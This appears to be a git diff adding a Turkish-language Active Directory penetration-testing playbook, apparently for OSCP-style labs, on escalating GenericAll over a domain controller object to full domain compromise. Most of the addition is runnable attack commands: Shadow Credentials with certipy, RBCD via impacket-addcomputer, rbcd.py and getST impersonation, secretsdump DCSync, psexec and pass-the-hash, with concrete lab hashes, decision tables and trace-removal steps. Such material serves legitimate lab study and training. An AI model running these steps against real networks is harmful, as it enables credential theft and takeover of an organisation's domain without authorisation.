@@ -246,3 +246,210 @@ KRB5CCNAME=ticket.ccache impacket-secretsdump -k -no-pass <machine>.<domain> -ju
 ```sh
 impacket-psexec Administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
 ```
+
+---
+# GenericAll → Domain Controller Computer Object — Metodoloji
+
+**Senaryo:** Bir DC'nin computer object'i (`ResourceDC$`) üzerinde `GenericAll` var. Amaç: bunu tam domain compromise'a (DCSync) çevirmek.
+
+**Neden RBCD'yi doğrudan atlamıyoruz:** DC$ hesabı zaten `DS-Replication-Get-Changes-All` hakkına doğal olarak sahip. Asıl mesele DC$ **olarak** authenticate olabilmek. İki yol var — sırayla dene.
+
+---
+
+## 0. Ön kontrol — GenericAll'ı doğrula
+
+```bash
+bloodyAD --host <dc-ip> -d resourced.local -u <user> -p <pass> get object 'ResourceDC$' --attr nTSecurityDescriptor
+```
+
+veya BloodHound'da edge'i teyit et. `dacledit.py` ile de ACL'i okuyabilirsin:
+
+```bash
+dacledit.py -action read -target 'ResourceDC$' 'resourced.local'/<user>:<pass>
+```
+
+**Decision point:** GenericAll teyit edilmediyse durma noktası burası — yanlış object üzerinde ilerleme.
+
+---
+
+## YOL 1 — Shadow Credentials (öncelikli dene)
+
+Daha az adım, ekstra makine hesabı gerektirmez, AD CS/PKINIT çalışan ortamda çoğu zaman doğrudan sonuç verir.
+
+### Adım 1 — Sahte key credential ekle ve PKINIT ile TGT al
+
+```bash
+certipy shadow auto -u '<user>@<domain>' -p '<pass>' -account 'ResourceDC$' -dc-ip <dc-ip>
+```
+
+```sh
+certipy-ad shadow auto -u 'l.livingstone@resourced.local' -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' -account 'RESOURCEDC$' -dc-ip 192.168.212.175 -dc-host 'RESOURCEDC.resourced.local' -ldap-scheme ldap -ldap-port 389 -debug
+```
+
+**Decision point:**
+
+|Sonuç|Sonraki adım|
+|---|---|
+|NT hash döndü (PKINIT başarılı)|Adım 2'ye geç — direkt DCSync|
+|`KDC_ERR_CERTIFICATE` / cert mapping hatası|AD CS PKINIT düzgün çalışmıyor → YOL 2'ye (RBCD) geç|
+|`msDS-KeyCredentialLink` yazımı "access denied"|GenericAll aslında object üzerinde değil / farklı bir ACE — ACL'i tekrar oku|
+
+### Adım 2 — NT hash ile DCSync
+
+```bash
+secretsdump.py -hashes :<NT_hash> 'resourced.local'/'ResourceDC$'@<dc-ip>
+```
+
+Bu tek komut krbtgt dahil tüm domain hash'lerini çeker → domain tam ele geçmiş demektir. **Buraya geldiysen metodoloji biter, RBCD'ye gerek yok.**
+
+### Temizlik (opsiyonel, iz bırakmamak için)
+
+```bash
+certipy shadow remove -u '<user>@resourced.local' -p '<pass>' -account 'ResourceDC$' -dc-ip <dc-ip>
+```
+
+---
+
+## YOL 2 — RBCD (Shadow Credentials çalışmazsa)
+
+```sh
+USER HASH
+   ↓
+RBCD
+   ↓
+ATTACKER$
+   ↓
+getST / S4U
+   ↓
+CIFS TICKET
+   ↓
+secretsdump
+   ↓
+ADMIN NT HASH
+   ↓
+PtH → WinRM
+```
+
+### Adım 1 — Kontrol edilebilir bir SPN'li hesap oluştur
+
+```bash
+impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Passw0rd123!' 'resourced.local'/<user>:<pass> -dc-ip <dc-ip>
+```
+
+```sh
+impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.246.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACKER$' -computer-pass 'Attacker123'
+```
+
+**Decision point:**
+
+|Sonuç|Sonraki adım|
+|---|---|
+|Başarılı|Adım 2'ye geç|
+|`ms-DS-MachineAccountQuota=0` veya "access denied"|Kendi kontrolündeki mevcut bir user/service account'u delegate-from olarak kullan; o da yoksa RBCD yolu tıkanmış demektir, YOL 1'e dönmeyi tekrar dene (farklı bir CA / template kontrolü ile)|
+
+### Adım 2 — msDS-AllowedToActOnBehalfOfOtherIdentity'yi set et
+
+```sh
+impacket-rbcd \
+  -delegate-to 'RESOURCEDC$' \
+  -delegate-from 'ATTACKER$' \
+  -action write \
+  'resourced.local/l.livingstone' \
+  -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' \
+  -dc-ip 192.168.212.175
+```
+
+```bash
+rbcd.py -delegate-to 'ResourceDC$' -delegate-from 'FAKE01$' -action write 'resourced.local'/<user>:<pass> -dc-ip <dc-ip>
+```
+
+```sh
+python3 rbcd.py \
+  -delegate-to 'ResourceDC$' \
+  -delegate-from 'FAKE01$' \
+  -action write \
+  'resourced.local/l.livingstone' \
+  -hashes ':19a3a7550ce8c505c2d46b5e39d6f808' \
+  -dc-ip 192.168.212.175
+```
+
+**Decision point:** "access denied" alırsan GenericAll'ın gerçekten bu object'te olduğunu `dacledit.py -action read -target 'ResourceDC$'` ile tekrar doğrula.
+
+### Adım 3 — S4U2Self + S4U2Proxy, Administrator olarak servis bileti al
+
+```bash
+getST.py -spn 'cifs/ResourceDC.RESOURCED.LOCAL' -impersonate 'Administrator' 'resourced.local'/'FAKE01$':'Passw0rd123!' -dc-ip <dc-ip>
+```
+
+```sh
+impacket-getST \
+  -spn 'cifs/RESOURCEDC.RESOURCED.LOCAL' \
+  -impersonate Administrator \
+  'resourced.local/ATTACKER$:Attacker123' \
+  -dc-ip 192.168.212.175
+```
+
+DCSync hedefliyorsan doğrudan LDAP servisi için de bilet al:
+
+```bash
+getST.py -spn 'ldap/ResourceDC.RESOURCED.LOCAL' -impersonate 'Administrator' 'resourced.local'/'FAKE01$':'Passw0rd123!' -dc-ip <dc-ip>
+```
+
+### Adım 4 — Bileti kullan ve DCSync çek
+
+```sh
+export KRB5CCNAME="$PWD/Administrator@cifs_RESOURCEDC.RESOURCED.LOCAL@RESOURCED.LOCAL.ccache"
+```
+
+```sh
+klist
+```
+
+```bash
+impacket-secretsdump \
+  -k \
+  -no-pass \
+  -dc-ip 192.168.212.175 \
+  -just-dc-user Administrator \
+  'RESOURCEDC.RESOURCED.LOCAL'
+```
+
+veya CIFS bileti ile dosya sistemi/PsExec tarzı erişim:
+
+```bash
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass 'ResourceDC.RESOURCED.LOCAL'
+```
+
+check:
+
+```sh
+nxc winrm 192.168.212.175 \
+  -u Administrator \
+  -H '<NTHASH>'
+```
+### Temizlik (opsiyonel)
+
+```bash
+rbcd.py -delegate-to 'ResourceDC$' -delegate-from 'FAKE01$' -action remove 'resourced.local'/<user>:<pass> -dc-ip <dc-ip>
+```
+
+---
+
+## Kaçınılması gereken GenericAll kullanımları (bu hedefte)
+
+|Aksiyon|Neden kaçın|
+|---|---|
+|DC$ hesabının şifresini `changepasswd.py` ile değiştirmek|Kerberos/replikasyon trust'ını bozar, DC domain'den düşebilir — production'da asla, sadece izole lab'da|
+|Grup üyeliği / privilege ekleme|Anlamsız — DC$ zaten replikasyon hakkına sahip, asıl mesele o hesap **olarak** authenticate olmak|
+|Object'i silmek|Geri dönüşü yok, DC'yi bozar|
+
+---
+
+## Öncelik sıralı hızlı özet (exam/gerçek ortamda önce bunu dene)
+
+1. **Shadow Credentials → PKINIT → NT hash → DCSync** (en hızlı, en az iz, en yüksek başarı oranı)
+2. **RBCD (addcomputer → rbcd.py → S4U2Self/Proxy → DCSync)** (Shadow Creds AD CS/PKINIT kısıtlıysa)
+3. Şifre değiştirme / grup üyeliği — sadece izole lab'da, production'da yapma
+
+**Not:** Her komutu hangi enumeration bulgusunun (GenericAll edge'i BloodHound'da/dacledit çıktısında görülmesi) tetiklediğini rapor için not al — OSCP raporu "neden bu komutu çalıştırdın" sorusuna cevap ister, sadece exploit başarısı yetmez.
